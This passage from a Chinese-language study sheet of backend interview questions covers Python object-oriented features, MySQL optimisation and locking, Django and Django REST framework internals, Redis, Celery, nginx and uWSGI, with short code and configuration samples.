super：可在子类中调用父类的方法或属性, 可能你会说, 子类本来就可以调用父类中所有非私有的属性或方法,而我现在说的是, 当子类中实现了某个方法, 父类中也有这个方法, 当你调用这个方法时, 既想执行子类的又想执行父类的, 在这种情况下就可以使用super()
mro：全称Method Resolution Order，方法解析顺序。方法调用时就需要对当前类和基类进行搜索以确定方法所在的位置，而搜索的顺序就是所谓的「方法解析顺序」。
反射：通过字符串来获取、设置、删除对象的属性或方法，其应用场景是框架
元类：因一切皆对象，实例化类的类，由内置元类type实例化得到，内置函数exec将执行期间产生的名字存放在局部和全局名称空间中，利用class关键字底层原理type(class_name,class_bases,class_namespace)，从而通过元类控制类的产生，利用魔法方法__call__来控制类的产生过程（先调用__new__产生一个空对象，再调用__init__初始化空对象，最后返回初始化对象）
单下划线:只有类对象和子类对象自己能访问到这些变量。
双下划线:只有类对象自己能访问，连子类对象也不能访问到这个数据。
__setattr__: 添加/修改属性会触发它的执行
__delattr__: 删除属性的时候会触发
__getattr__: 只有在使用点调用属性且属性不存在的时候才会触发
__getattribute__: 不管是否存在,我都会执行
类变量:所有对象共有，其中一个对象将它值改变，其他对象得到的就是改变后的结果
实例变量:对象私有，某一个对象将其值改变，不影响其他对象
非绑定方法或静态方法：定义在类内部的普通方法，谁都不绑定，对象或类都可调用，但是不会自动传值
绑定方法：对象绑定方法和类的绑定方法，其特殊之处在于绑定给谁就是谁来调用，并且把自身传过来，用于不需要通过对象，只需要通过类来完成某事时，当然对象也可调用，一般不用。
type：只接收一个参数，不但可以判断变量是否属于某个类型，而且可以得到参数变量未知的所属的类型
isinstance：只能判断是否属于某个已知类型，不能直接得到变量未知的所属的类型
单例模式：即单个实例是同一个类实例化多次的结果指向同一个对象，用于节省内存空间
# 通过类的绑定方法实现单例模式
import settings
class Mysql:
    _instance = None
    def __init__(self, host, port):
        self.host = host
        self.port = port
    @classmethod
    def singleton(cls):
        if not cls._instance:
            cls._instance = Mysql(settings.HOST, settings.PORT)
        return cls._instance
obj1 = Mysql('127.0.0.1', '3307')
obj2 = Mysql('127.0.0.1', '3308')
print(obj1 is obj2)  # False
obj3 = Mysql.singleton()
obj4 = Mysql.singleton()
print(obj3 is obj4)  # True
with语句：在嵌套的代码执行之后，自动关闭文件。
with context_expression [as target(s)]:
    with-body
context_expression：返回一个上下文管理器对象，自定义的上下文管理器要实现上下文管理协议所需要的 __enter__() 和 __exit__() 两个方法
```

## 熟练使用Python语言三大器、列表推导式、字典生成式、匿名函数

```python
装饰器定义：本质上是一个函数，在满足不改变被装饰函数的调用方式和代码的前提下，被装饰的函数当作参数传到装饰器里，然后把值赋值给被装饰函数，其实调用的是装饰器的内层函数来执行。
from functools import wraps
def outter(func): # func是被装饰的函数
    @wraps(func)
    def inner(*args,**kwargs): # inner是未来要运行的函数
        # 此处加功能
        res = func(*args,**kwargs)
        return res
    return inner
@outter
def learn():
    pass
print(learn)  # 若没加装饰器修复技术，打印login仍是inner函数内存地址，没达到已加乱真，反之则打印login函数的内存地址及所有相关信息
生成器定义：函数内部有yield则就是生成器函数，调用函数则返回一个生成器，循环生成器时，则函数内部代码才会执行。本质上生成器是特殊的迭代器
可迭代对象：具有__iter__()方法的对象，除了数字类型和函数之外都是可迭代对象，可迭代对象不一定是迭代器对象。
迭代器对象：既具有__iter__方法，又具有__next__方法的对象，只有文件是迭代器对象，迭代器对象一定是可迭代对象。
列表推导式：lt = [i**2 for i in range(10)]或lt = [(k,v) for (k,v) in dic.items()]
字典生成式：dic_new = {k:v**2 for k,v in dic.items()}，一般与zip拉链函数配合使用dic = {k:v**2 for k,v in zip(['a','b','c'],[1,2,3])}
匿名函数：没有绑定变量名，使用一次就被回收，加括号就可运行，通常与max()、sorted()、filter()方法联合使用
max(salary_dict,key=lambda name:salary_dict[name])
sorted(salary_dict,key=lambda name:salary_dict[name])
```

## 数据库怎么优化查询效率？

```python
1）引擎选择：若数据表需事务处理，应考虑innodb，因完全符合ACID特性，不需要事务处理，默认存储引擎myisam
2）分表分库，主从
3）对查询进行优化，尽量避免全表扫描，先考虑where及order by涉及的列上建立索引
4）对于多张大数据量的表JOIN，要先分页再JOIN，否则性能很差
```

## 数据库三大范式

```python
范式：数据库设计对数据的存储性能还有对数据的操作都有关系，故需要一定的规范
第一范式：要求数据库表的每一列都是不可分割的原子数据项。
第二范式：在第一范式基础上，确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关（主要针对联合主键而言）。
第三范式：在第二范式基础上，确保数据表中的每一列数据都和主键直接相关，而不能间接相关。
```

## 数据库负载均衡

```python
定义：由一组相互独立的计算机构成，通过网络进行连接，由路由器衔接在一起，各节点相互协作、共同负载、均衡压力，对客户端来说，整个集群可视为一台具有超高性能的独立服务器
```

## 优化数据库？

```python
本质：数据库是文件，读写文件是IO操作，缓存是代码，运行代码是内存操作，即优化方案从如何降低IO，把内存IO移动到硬盘IO直接提高效率，降低IO次数，高级是算法优化。
1）在程序中，保证实现功能基础上，尽量减少对数据库访问次数
2）避免使用不兼容的数据类型，如float和int、char和varchar等
3）存储引擎
4）评论数、点赞数、点踩数虽可通过跨表查询得出，但查询数据库频率太高，将三者设计为普通字段
5）使用缓存
6）垂直分表：把一些不经常读的数据放在一张表中，节约磁盘IO
7）设计表时严格按照设计范式设计
```

## 数据库引擎

```python
# 存储引擎是针对表的，驱动数据的方式-数据库优化
mysql>show engines;查看所有引擎
1）innodb（默认）：支持事务、行级锁、外键，安全性能高但效率偏低
2）myisam：查询效率优于innodb，当不需要支持事务、行级锁、外键，即不考虑安全性时可设置myisam来优化数据库
3）blackhole：像黑洞一样的存储引擎，存什么就会没什么。
4）memory：像内存一样的存储引擎，断电或退出即消失
```

## 1000w条数据，使用limit offset分页时，为什么越往后越慢，如何解决？

```python
当一个数据库表过于庞大，LIMIT offset, length中的offset值过大，则SQL查询语句会非常缓慢，你需增加order by，并且order by字段需要建立索引。

如果使用子查询去优化LIMIT的话，则子查询必须是连续的，某种意义来讲，子查询不应该有where条件，where会过滤数据，使数据失去连续性。

如果你查询的记录比较大，并且数据传输量比较大，比如包含了text类型的field，则可以通过建立子查询。
```

## 简述触发器、函数、视图、存储过程？

```python
触发器：触发器是一个特殊的存储过程，它是MySQL在insert、update、delete的时候自动执行的代码块。

函数：MySQL中提供了许多内置函数，还可以自定义函数（实现程序员需要sql逻辑处理）
　　 自定义函数创建语法：
　　　　   创建：CREATE FUNCTION 函数名称(参数列表) 　
　　　       RETURNS 返回值类型 　函数体
 　　修改： ALTER FUNCTION 函数名称 [characteristic ...]
　　 删除：DROP FUNCTION [IF EXISTS] 函数名称
　　 调用：SELECT 函数名称(参数列表)
  
视图：视图是由查询结果形成的一张虚拟表，是表通过某种运算得到的一个投影
　　 　　 create view view_name as select 语句
  
存储过程：把一段代码封装起来，当要执行这一段代码的时候，可以通过调用该存储过程来实现（经过第一次编译后再次调用不需要再次编译，比一个个执行sql语句效率高）
　　 create procedure 存储过程名(参数,参数,…)
　　 begin
　　 //代码
　　 end
```

## 事务

```python
事务：包含多条执行的sql语句，如转账--从一个用户将资金转出，再将资金转入到另一个用户
start transaction; --开启事务,在这条语句之后的sql将处在同一事务,并不会立即修改数据库
commit;--提交事务,让这个事务中的sql立即执行数据的操作,
rollback;--回滚事务,取消这个事务,这个事务不会对数据库中的数据产生任何影响
事务的四大特性（ACID）：
1）原子性：事务是一组不可分割的单位，要么同时成功，要么同时失败
2）一致性：事务前后的数据应该保持一致
3）隔离性：多用户并发访问数据时，一个用户的事务不能被其它事务所干扰
4）持久性：一个事务一旦被提交，对数据的改变是永久性的
```

## 数据库锁的作用？

```python
根据不同的锁的作用域我们可以把数据库的锁分为三种，分别为：
  行锁：对表中的某一行进行加锁。
  页锁：对表中一组连续的行进行加锁。
  表锁：对整张表进行加锁
不同的作用域对并发性能是有很大影响的，比如说如果数据库的插入都是使用表锁，那在大量用户对某张表进行插入读取操作的话，同时只能有一个用户可以访问该表，那并发量肯定就是惨不忍睹了。

乐观锁
在乐观锁中，我们有3种常用的做法来实现：

第一种就是在数据取得的时候把整个数据都copy到应用中，在进行提交的时候比对当前数据库中的数据和开始的时候更新前取得的数据。当发现两个数据一模一样以后，就表示没有冲突可以提交，否则则是并发冲突，需要去用业务逻辑进行解决。

第二种乐观锁的做法就是采用版本戳，这个在Hibernate中得到了使用。采用版本戳的话，首先需要在你有乐观锁的数据库table上建立一个新的column，比如为number型，当你数据每更新一次的时候，版本数就会往上增加1。比如同样有2个session同样对某条数据进行操作。两者都取到当前的数据的版本号为1，当第一个session进行数据更新后，在提交的时候查看到当前数据的版本还为1，和自己一开始取到的版本相同。就正式提交，然后把版本号增加1，这个时候当前数据的版本为2。当第二个session也更新了数据提交的时候，发现数据库中版本为2，和一开始这个session取到的版本号不一致，就知道别人更新过此条数据，这个时候再进行业务处理，比如整个Transaction都Rollback等等操作。在用版本戳的时候，可以在应用程序侧使用版本戳的验证，也可以在数据库侧采用Trigger(触发器)来进行验证。不过数据库的Trigger的性能开销还是比较的大，所以能在应用侧进行验证的话还是推荐不用Trigger。

第三种做法和第二种做法有点类似，就是也新增一个Table的Column，不过这次这个column是采用timestamp型，存储数据最后更新的时间。在Oracle9i以后可以采用新的数据类型，也就是timestamp with time zone类型来做时间戳。这种Timestamp的数据精度在Oracle的时间类型中是最高的，精确到微秒(还没与到纳秒的级别)，一般来说，加上数据库处理时间和人的思考动作时间，微秒级别是非常非常够了，其实只要精确到毫秒甚至秒都应该没有什么问题。和刚才的版本戳类似，也是在更新提交的时候检查当前数据库中数据的时间戳和自己更新前取到的时间戳进行对比，如果一致则OK，否则就是版本冲突。如果不想把代码写在程序中或者由于别的原因无法把代码写在现有的程序中，也可以把这个时间戳乐观锁逻辑写在Trigger或者存储过程中

悲观锁（排他锁）
悲观锁也称之为互斥锁，可以写为X锁，指的是同时只能有一个事务可以对某个资源进行访问操作。如果有两个事务同时要操作某张表，我们称之为事务A和事务B，如果事务A获得了这张表的表锁，那事务B只能等待事务A释放了这个锁之后才能对该表进行操作。

数据库的insert，update操作默认是采用互斥锁进行加锁，读取select则不是，如果要对select操作使用互斥锁，可以这样写

select * from table where id = 1 for update
共享锁
共享锁是一种乐观锁，可以写为S锁，在数据库中共享锁的作用主要是针对读取操作的。如果读取操作使用X锁的话，并发量会非常低，所以数据库提供了共享锁S锁，提高读取操作的并发性能，多个事务可以同时持有一个资源的S锁，不像X锁，同时只能有一个事务持有。

举个例子：

事务A和事务B对表TABLE进行访问，事务A想查看id = 1的行信息

select * from TABLE where id = 1 lock in share mode
如果当前id = 1的行对应的X锁没有被其他事务获取，那事务A就顺利的获得了该行的S锁。

现在事务B也想查看id = 1 的行信息，会怎么样？

select * from TABLE where id = 1 lock in share mode
现在持有该行锁的只有事务A，持有的是S锁，所以事务B也可以获取该行的S锁，两个事务可以并发的读取id = 1的行。

这个和之前所说的乐观锁实现是有区别的，最大的不同就是读取的时候共享锁是要真的去持有锁，但是乐观锁只是实现了一种CAS模式，但是并读取的时候没有真的持有锁。
```

## 简述数据库分库分表？

```python
# 水平分库
1、概念：以字段为依据，按照一定策略（hash、range等），将一个库中的数据拆分到多个库中。
2、结果：
  每个库的结构都一样；
  每个库的数据都不一样，没有交集；
  所有库的并集是全量数据；
3、场景：系统绝对并发量上来了，分表难以根本上解决问题，并且还没有明显的业务归属来垂直分库。
4、分析：库多了，io和cpu的压力自然可以成倍缓解。

# 水平分表
1、概念：以字段为依据，按照一定策略（hash、range等），将一个表中的数据拆分到多个表中。
2、结果：
  每个表的结构都一样；
  每个表的数据都不一样，没有交集；
  所有表的并集是全量数据；
3、场景：系统绝对并发量并没有上来，只是单表的数据量太多，影响了SQL效率，加重了CPU负担，以至于成为瓶颈。
4、分析：表的数据量少了，单次SQL执行效率高，自然减轻了CPU的负担。

# 垂直分库
1、概念：以表为依据，按照业务归属不同，将不同的表拆分到不同的库中。
2、结果：
  每个库的结构都不一样；
  每个库的数据也不一样，没有交集；
  所有库的并集是全量数据；
3、场景：系统绝对并发量上来了，并且可以抽象出单独的业务模块。
4、分析：到这一步，基本上就可以服务化了。例如，随着业务的发展一些公用的配置表、字典表等越来越多，这时可以将这些表拆到单独的库中，甚至可以服务化。再有，随着业务的发展孵化出了一套业务模式，这时可以将相关的表拆到单独的库中，甚至可以服务化。

# 垂直分表
1、概念：以字段为依据，按照字段的活跃性，将表中字段拆到不同的表（主表和扩展表）中。
2、结果：
  2.1、每个表的结构都不一样；
  2.2、每个表的数据也不一样，一般来说，每个表的字段至少有一列交集，一般是主键，用于关联数据；
  2.3、所有表的并集是全量数据；
3、场景：系统绝对并发量并没有上来，表的记录并不多，但是字段多，并且热点数据和非热点数据在一起，单行数据所需的存储空间较大。以至于数据库缓存的数据行减少，查询时会去读磁盘数据产生大量的随机读IO，产生IO瓶颈。
4、分析：可以用列表页和详情页来帮助理解。垂直分表的拆分原则是将热点数据（可能会冗余经常一起查询的数据）放在一起作为主表，非热点数据放在一起作为扩展表。这样更多的热点数据就能被缓存下来，进而减少了随机读IO。拆了之后，要想获得全部数据就需要关联两个表来取数据。
但记住，千万别用join，因为join不仅会增加CPU负担并且会讲两个表耦合在一起（必须在一个数据库实例上）。关联数据，应该在业务Service层做文章，分别获取主表和扩展表数据然后用关联字段关联得到全部数据。
```

## 简述数据库读写分离？

```python
MySQL Proxy最强大的一项功能是实现“读写分离(Read/Write Splitting)”。基本的原理是让主数据库处理事务性查询，而从数据库处理SELECT查询。数据库复制被用来把事务性查询导致的变更同步到集群中的从数据库。 当然，主服务器也可以提供查询服务。使用读写分离最大的作用无非是环境服务器压力。
读写分离的好处:
1、增加冗余
2、增加了机器的处理能力
3、对于读操作为主的应用，使用读写分离是最好的场景，因为可以确保写的服务器压力更小，而读又可以接受点时间上的延迟。
读写分离提高性能之原因:
1、物理服务器增加，负荷增加
2、主从只负责各自的写和读，极大程度的缓解X锁和S锁争用
3、从库可配置myisam引擎，提升查询性能以及节约系统开销
4、从库同步主库的数据和主库直接写还是有区别的，通过主库发送来的binlog恢复
```

## 简述char与varchar的区别？

```python
1）char：定长，按规定宽度存放数据并以规定宽度读取数据，通常更占空间，存取更高效
2）varchar：不定长，根据数据长度计算所需宽度，并在数据开始以数据头方式将宽度信息保存起来，计算耗时，通常节省空间
总结：数据长度相近的数据提倡用char来存放数据，数据需高效存取，以空间换时间，采用char。
```

## 简述leftjoin和rightjoin的区别？

```python
left join:外链接之左连接：优先显示左表全部记录,以左表为准，即找出所有员工信息，当然包括没有部门的员工，本质就是：在内连接的基础上增加左边有右边没有的结果
right join:外链接之右连接：优先显示右表全部记录，以右表为准，即找出所有部门信息，包括没有员工的部门，本质就是：在内连接的基础上增加右边有左边没有的结果
```

## 索引有什么作用，有什么分类，优劣点？

```python
1）索引就是键（key）且是添加给数据库表字段的
2）给表创建键后，该表不仅会形成表结构、表数据，还有键的B+结构图
3）键的结构图是需要维护的，在数据完成增删改操作时，只有影响到有键的字段，结构图都要维护一侧，故创建键后一定会降低增删改的效率
4）键极大的加快查询速度（开发需求中，几乎业务和查有关系）--主从复制（读写分离）、一主两从
5）建立键的方式：主键、外键、唯一键、index
```

## MySQL慢日志

```python
慢日志查询：记录sql语句中超过设定的时间阈值的查询语句。例如，一条查询sql语句，我们设置的阈值为1s，当这条查询语句的执行时间超过了1s，则将被写入到慢查询配置的日志中.慢查询主要是为了我们做sql语句的优化功能.
```

## 如何利用Redis做缓存？

```python
# 设置django缓存存放位置为redis数据库,并设置一个默认(default)选项,在redis中(配置文件/etc/redis/redis.conf)开启了RDB持久化储存
# pip install django-redis, 然后在视图中可以通过 from django_redis import get_redis_connection 这个方法和redis数据库进行连接
CACHES = {
    "default": {
        "BACKEND": "django_redis.cache.RedisCache",
        # redis服务器的ip地址及端口号,及数据库序号,redis一共有15个数据库 0~15
        "LOCATION": "redis://127.0.0.1:6379/6",
　　　　　# "LOCATION": "redis://:passwordpassword@47.193.146.xxx:6379/0", # 如果redis设置密码的话，需要以这种格式进行设置,host前面是密码
        "OPTIONS": {
            "CLIENT_CLASS": "django_redis.client.DefaultClient",
        }
    }
}
```

## 基于django使用ajax发送post请求时，有那种方式携带csrftoken？

```python
1）后端将csrftoken传到前端，发送post请求时携带发送
data: {
        csrfmiddlewaretoken: '{{ csrf_token }}'
  },
2）获取form中隐藏标签的csrftoken值，加入到请求数据中到后端
data: {
          csrfmiddlewaretoken:$('[name="csrfmiddlewaretoken"]').val()
     },
3）cookie中存在csrftoken，将值放到请求头中
headers:{ "X-CSRFtoken":$.cookie("csrftoken")} 
```

## django中Model中ForeignKey字段中的on_delete参数有什么作用？

```python
删除关联表中的数据时,当前表与其关联的field的操作
django2.0之后，表与表之间关联的时候,必须要写on_delete参数,否则会报异常
```

## django中如何执行原生SQL？

```python
1）使用execute执行自定义的SQL（类似于pymysql的用法）
from django.db import connection
cursor = connection.cursor()
cursor.execute("SELECT DATE_FORMAT(create_time, '%Y-%m') FROM blog_article;")
ret = cursor.fetchall()
print(ret)
2）使用extra方法 ：queryset.extra(select={"key": "原生的SQL语句"})
3）使用raw方法
```

## django如何连接多个数据库并实现读写分离？

```python
# 在配置文件中
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'HOST': '127.0.0.1',  # 主服务器的运行ip
        'PORT': 3306,   # 主服务器的运行port
        'USER': 'django',  # 主服务器的用户名
        'PASSWORD': 'django',  # 主服务器的密码
        'NAME': 'djangobase'   #  数据表名
    },
    'slave': {
        'ENGINE': 'django.db.backends.mysql', 
        'HOST': '127.0.0.1',
        'PORT': 8306,
        'USER': 'django_slave',
        'PASSWORD': 'django_slave',
        'NAME': 'djangobase_slave'
    }
}　　
# 在utils中创建db_router.py文件，并定义一个db类来进行读写分离
class MasterSlaveDBRouter(object):
    """数据库主从读写分离路由"""
 
    def db_for_read(self, model, **hints):
        """读数据库"""
        return "slave"
 
    def db_for_write(self, model, **hints):
        """写数据库"""
        return "default"
 
    def allow_relation(self, obj1, obj2, **hints):
        """是否运行关联操作"""
        return True　
# 在配置文件中配置读写分离
DATABASE_ROUTERS = ['项目名.utils.db_router."自定义的类名称"']
```

## 如何给CBV函数设置装饰器

  ```python
  from django.utils.decorators import method_decorator
          # 给方法加：
              @method_decorator(check_login)
              def post(self, request):
                  ...
          # 给dispatch加：
              @method_decorator(check_login)
              def dispatch(self, request, *args, **kwargs):
                  ...
          # 给类加：
              @method_decorator(check_login, name="get")
              @method_decorator(check_login, name="post")
              class HomeView(View):
                  ... 
  ```

* Django中如何在model保存前做一定的固定操作，如写一句日志

  ```python
  利用Django的Model的Signal Dispatcher，通过django.db.models.signals.pre_save()方法，在事件发生前发射触发信号，这一切都被调度中的receiver方法深藏。信号处理一般写在Model中
  import logging
  from django.db import models
  from django.db.models.signals import pre_save
  from django.dispatch import receiver
  class Order(models.Model):
  logger = logging.getLogger(__name__)
  @receiver(pre_save, sender=Order)
  def pre_save_handler(sender, **kwargs):
   logger.debug("{},{}".format(sender, **kwargs))
  ```

* websocket协议及原理

  ```python
  websocket是一种在单个TCP连接上进行全双工通讯的协议，双工（duplex）是指两台通讯设备之间，允许有双向的资料传输。全双工的是指，允许两台设备间同时进行双向资料传输。这是相对于半双工来说的，半双工不能同时进行双向传输，这期间的区别相当于手机和对讲机的区别，手机在讲话的同时也能听到对方说话，对讲机只能一个说完另一个才能说。
  django中实现websocket大致有两种方式：一种是channels，依赖于Redis等，一种是dwebsocket
  ```
##  反向解析

  ```python
  场景：模板中的超链接，视图中的重定向
  使用：在定义路由url时为include定义namespace属性，为url定义name属性，在模板中使用url标签{% url 'namespace_value:name_value'%}，在视图中使用reverse函数：redirect(reverse('namespace_value:name_value'))
  ```

## HttpRequest和HttpResponse？

```python
HttpRequest:django接收用户发送的请求报文后，将报文封装到HttpRequest对象中去
HttpResponse：返回一个数据报文，render内部已经封装好了HttpResponse类
请求对象：视图第一个参数必须是HttpRequest对象，因处理web请求必须是请求对象，从根本上说是基于web框架，故view处理的一个request对象，请求的所有属性可根据根式：request.属性
1）request.path:请求页面路径，不包含域名
2）request.get_full_path:获取带参数的路径
3）request.method:获取页面请求方式
4）request.GET:获取get请求方式的数据
5）request.POST:获取post请求方式的数据
6）request.COOKIES:获取cookie
7）request.session:获取session
8）request.FILES:上传图片
```

## git常用命令

```python
1）git clone:克隆指定仓库
2）git status：查看当前仓库状态
3）git diff：比较版本的区别
4）git log：查看日志
5）git reset：回溯历史版本
6）git add：将文件添加到暂存区
7）git commit：将文件提交到服务器
8）git checkout：切换到指定分支
9）git rm：删除指定文件
.gitignore文件的作用：
# 此为注释 – 将被 Git 忽略
*.a       # 忽略所有 .a 结尾的文件
!lib.a    # 但 lib.a 除外
/TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO
build/    # 忽略 build/ 目录下的所有文件
doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt
```

## apache和nginx的区别

```python
nginx:更轻量级、扛并发、异步非阻塞
apche：阻塞型、模块超多
```

## Django中对数据查询结果排序怎么做，降序怎么做，查询大于某个字段怎么做？

```python
1）排序使用order_by()
2）降序需在排序字段名加-
3）查询字段大于某值使用filter(字段名_gt=值)
```

##  跨域问题（CORS）

  ```python
  源：若两个页面的协议、端口、域名都相同，则两个页面具有相同的源
  同源策略：浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源
  原因：浏览器的同源策略，浏览器拒绝不是当前域返回的数据
  解决方案一：利用第三方模块django-cors-headers
  解决方案二：利用中间件
  ```

## django中当用户登录A应用服务器,下次请求被nignx代理到B应用服务器,会产生什么影

```python
影响：若用户在A应用服务器登录的session数据没共享到B应用服务器上，那么之前的登录状态就没有了。
```

## Django中QuerySet的get和filter方法的区别？

```python
1）参数：get的参数只能是model中定义的字段，而filter参数既可以是字段，也可以是where查询关键字，如in、like等
2）返回值：get返回值是一个定义的model对象，而filter返回值是一个新queryset对象，值得一提的是queryset是一个集合对象，既可以一直使用点方法，也可迭代、遍历、切片等，但不等于是list类型。
3）异常：get只有一条记录返回时才正常，当返回多条记录或没查到时会抛异常，而filter有没有记录都不会报错.
```

##  简述Django中内置缓存机制？

  ```python
  Django提供6种缓存机制：
  1）开发调试
  2）内存
  3）文件
  4）数据库
  5）Memcache缓存（python-memcached模块）
  6）Memcache缓存（pylibmc模块）
  除此之外还可使用Redis缓存，因Django是动态网站，每次请求会去数据库进行相应操作，当程序访问量大时，耗时必然会更加明显。
  解决方案：利用缓存将某个views的返回值保存至内存或memcache中，默认配置5分钟再有人访问，则不去执行view中的操作，而是直接从内存或Redis中获取缓存内容并返回
  ```

## Celery分布式任务队列

```python
原因：用户发起请求并等待响应返回，此过程可能需要执行一段时间，用户等待很长时间，造成不好的用户体验。
解决方案：将耗时的程序放到celery中执行并将耗时的任务添加到队列queue中，即使用Redis实现broke中间人，然后用多个worker去监听队列里的任务去执行
流程：客户端--->任务发送--->任务队列（broker）<---获取任务处理<---任务处理者（worker）
重要概念：
1）任务task：一个python函数
2）队列queue：将需要执行的任务加入到队列中
3）工人worker：在一个新进程中，负责执行队列中的任务
4）代理人broker：负责调度，在布置环境中使用Redis
正向代理：请求经过代理服务器从局域网发出，然后到达互联网上的服务器，特点是服务端不知道真正的客户端是谁
反向代理：请求从互联网发出，先进入代理服务器，再转发给局域网内的服务器，特点是客户端并不知道真正的服务端是谁，而两种的区别是正向代理的对象是客户端，反向代理的对象是服务端
```

##  谈谈RESTful风格的API？

  ```python
  REST(表现层状态转换):Representational State Transfer，是一种设计风格而不是标准，一种客户端和服务器的交互形式
  1）url设计
  a.一般采用https协议进行传输，保证数据交互安全性
  b.用api关键字标识接口url
  c.多版本共存
  d.前后台交互的数据即资源
  e.资源操作由请求方式决定，如get请求获取数据、post请求增加数据、put请求整体修改数据、patch请求局部修改数据、delete请求删除数据
  2）响应状态码
  a.200常规请求
  b.201创建成功
  c.301永久重定向
  d.302暂时重定向
  e.403请求无权限
  f.404请求路径不存在
  g.405请求方法不存在
  h.500服务器异常
  3）响应结果
  a.数据状态码status
  b.数据状态信息message
  c.数据本身results
  d.二次请求访问资源请求链接img（选写）
  ```
##  谈谈django-restframework的理解

  ```python
  作用：写接口
  # 请求模块
  功能介绍：
  1）drf的request是在wsgi的_request基础上进行二次封装，而_request仅作为drf中的一个属性，同时对_request做了完全兼容
  2）drf的request对数据解析更加规范，所有拼接参数（params）都解析到query_params中，所有数据包数据（body）都解析到data中，所有的请求头数据（headers）都解析到META中
  3）query_params和data属于QueryDict类型，可通过.dict()转化成原生dict类型
  源码分析：
  1）drf的APIView类重写as_view方法，从而局部禁用csrf认证
  2）drf的APIView类重写dispatch方法，从而对request进行二次封装
  # 渲染模块
  1）在视图类中通过renderer_classes对该视图的响应数据做局部配置，可做浏览器渲染
  2）在配置文件中通过DEFAULT_RENDERER_CLASSES对全部视图的响应数据做全局配置，只渲染json
  源码分析：
  1）drf的APIView类中的dispatch方法对响应对象进行二次封装，完成多种渲染方式
  2）在dispatch方法中的finalize_response属性，内部完成解析配置的渲染类
  3）先从视图类找renderer_classes类属性（局部配置），再从APIView类属性（配置文件），再从项目配置文件中（全局配置），最后从drf默认配置文件中找（默认配置）
  # 解析模块
  功能介绍：
  1）在视图类中通过parser_classes属性对该视图的数据包解析做局部配置
  2）在配置文件中通过DEFAULT_PARSER_CLASSES对全局视图的数据包解析做全局配置
  3）默认支持三种请求数据包格式：json类型、urlencoded类型、form-data类型
  源码分析：
  1）在APIView类中的dispatch方法内部既对request二次封装还提供数据解析
  2）准备解析的内容字典并提供解析的类对象
  # 序列化模块
  为何使用：后台的数据多以类对象形式存在，经过序列化后，格式化成返回给前台的数据
  序列化：
  1）视图类三步操作：
  a.ORM操作数据库拿到资源数据
  b.序列化返回给前台的数据
  c.返回序列化后的数据
  2）视图类中序列化操作：
  a.直接将要序列化的数据传给序列化类
  b.若序列化数据是单个对象，序列化参数many默认为False，反之是多个对象，序列化参数many修改为True
  3）自定义序列化类：
  a.model类中给前台的字段即系统字段必须跟model类字段名保持一致
  b.自定义序列化字段用SerializerMethodField()，该字段值来源于get_自定义字段名(序列化对象,Model对象)方法的返回值
  反序列化：
  1）视图类三步操作
  a.从请求对象中获取前台数据
  b.校验前台数据是否合法
  c.反序列化成后台Model对象与数据库交互
  2）视图类中反序列化操作：
  a.将要反序列化的数据传给序列化类的data参数
  b.若反序列化的数据是单个字典，反序列化参数many默认为False，反之是多个字典的对象，反序列化参数many为True
  3）自定义反序列化类
  a.系统字段最好跟model类字段名保持一致，且参数required决定该字段是否必须校验字段
  b.自定义反序列化字段校验规则同系统字段，但在自定义校验规则中将其取出，不参与数据库交互
  c.局部钩子方法命名validate_属性名(self, 属性的value)，校验规则为成功返回属性的value 失败抛出校验错误的异常
  d.全局钩子方法命名 validate(self, 所有属性attrs)，校验规则为成功返回attrs 失败抛出校验错误的异常
  ```

## Django如何提升性能（高并发）？

```python
# 前端
1）减少http请求，减少数据库的访问量，如使用雪碧图
2）使用浏览器缓存，将常用的css、js、logo图标等静态资源缓存到本地浏览器，通过设置http请求头中的cache-control和expires的属性可设定浏览器缓存
3）对html、css、js文件进行压缩，减少网络的流通量
# 后端
1）合理使用缓存技术，对常用的动态数据，如首页做缓存并设置过期时间，减少对数据库的压力，提高网站性能
2）使用celery消息队列，将耗时的操作扔到队列中，让worker去监听队列里的任务，实现异步操作，如发邮件、发短信
3）代码上优化，如nginx部署项目配置合适的配置参数，提升效率，增加并发量
4）若考虑安全因素，服务器磁盘用固态硬盘读写远大于机械硬盘，但没普及，主要是固态硬盘技术还不完全成熟
5）搭建服务器集群，将并发访问请求分散到多台服务器上处理
6）运维人员的一些性能优化技术
```

## 验证码过期时间怎么设置

```python
将验证码保存到数据库或session中，设置过期时间1分钟，然后页面利用js设置一个倒计时展示，1分钟后再次点击获取新验证码
```

## Django开发中数据库优化？

```python
1）设计表时，少使用外键，因外键约束会影响插入和删除功能
2）使用缓存，减少对数据库的访问
3）设计表时能用varchar确定字段长度就别用text
4）给搜索频率高的字段创建索引
5）若一个页面需多次数据库连接，最好一次性取出所有数据，减少查询次数
6）若页面只需要数据库某一两个字段用QuerySet.values()
```

## 对uWSGI和nginx的理解

```python
1）WSGI：全称是Web Server Gateway Interface，即Web服务器网关接口，定义了Web服务器如何与Python应用程序进行交互。
2）uWSGI：实现uwsgi和WSGI两种协议的web服务器
3）uwsgi：实现uWSGI的功能模块，常用于uWSGI服务器与其他网络服务器的数据通信
4）nginx：一种开源的高性能的HTTP服务器和反向代理，处理静态文件和索引文件效率高，稳定性高，负载均衡功能提高网站并发量
5）两者如何配合工作？
a.浏览器发起HTTP请求到nginx服务器，nginx接收到请求进行分析，判断访问资源类型
b.如果是静态资源直接返回给浏览器，如果是动态资源就转交给uwsgi服务器，根据自身的WSGI协议找到对应的Django框架
c.找到后进行逻辑处理将返回值发送到uwsgi服务器，再返回给nginx，最后通过nginx将返回值返回给浏览器进行渲染显示给用户
```

## Django中间件

![img](https://images.cnblogs.com/cnblogs_com/daizongqi/1581977/o_191218122928%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20191218202822.png)

```python
1）先画出Django生命请求周期流程图
当用户在浏览器中输入url时,浏览器会生成请求头和请求体发给服务端，请求头和请求体中会包含浏览器的动作(action),这个动作通常为get或者post,体现在url之中，url经过Django中的wsgi,再经过Django的中间件,最后url到过路由映射表,在路由中一条一条进行匹配,一旦其中一条匹配成功就执行对应的视图函数,后面的路由就不再继续匹配了，视图函数根据客户端的请求查询相应的数据.返回给Django,然后Django把客户端想要的数据做为一个字符串返回给客户端，客户端浏览器接收到返回的数据,经过渲染后显示给用户。
